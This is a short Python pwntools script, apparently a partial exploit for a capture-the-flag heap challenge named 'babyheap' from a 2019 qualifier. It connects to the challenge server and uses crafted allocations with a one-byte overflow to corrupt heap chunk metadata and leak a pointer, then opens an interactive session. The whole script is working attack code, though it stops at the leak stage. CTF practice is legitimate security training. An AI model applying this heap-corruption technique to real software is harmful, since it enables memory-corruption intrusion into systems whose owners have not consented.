from pwn import *

p = process('./babyheap')
p = remote('babyheap.quals2019.oooverflow.io',5000)
elf = ELF('./babyheap')
libc = ELF('./libc.so')
context.log_level = 'debug'

def add(size,content):
    p.sendlineafter('> ','M')
    p.sendlineafter('> ',str(size))
    p.sendlineafter('> ',content)

def delete(index):
    p.sendlineafter('> ','F')
    p.sendlineafter('> \n',str(index))

def show(index):
    p.sendlineafter('> ','S')
    p.sendlineafter('> ',str(index))

add(0xf8,'A'*0xf8)
add(0x178,'A'*0x178)
add(0xf8,'A'*0xf8)
add(0xf8,'A'*0x78+'\x81')
add(0xf8,'A')
delete(1)
add(0x178,'A'*0x178+'\x81')
delete(2)
add(0xf8,'A'*0xf8)

show(3)
data = u64(p.recv(6).ljust(8,'\x00'))
print hex(data)
#gdb.attach(p)

p.interactive()
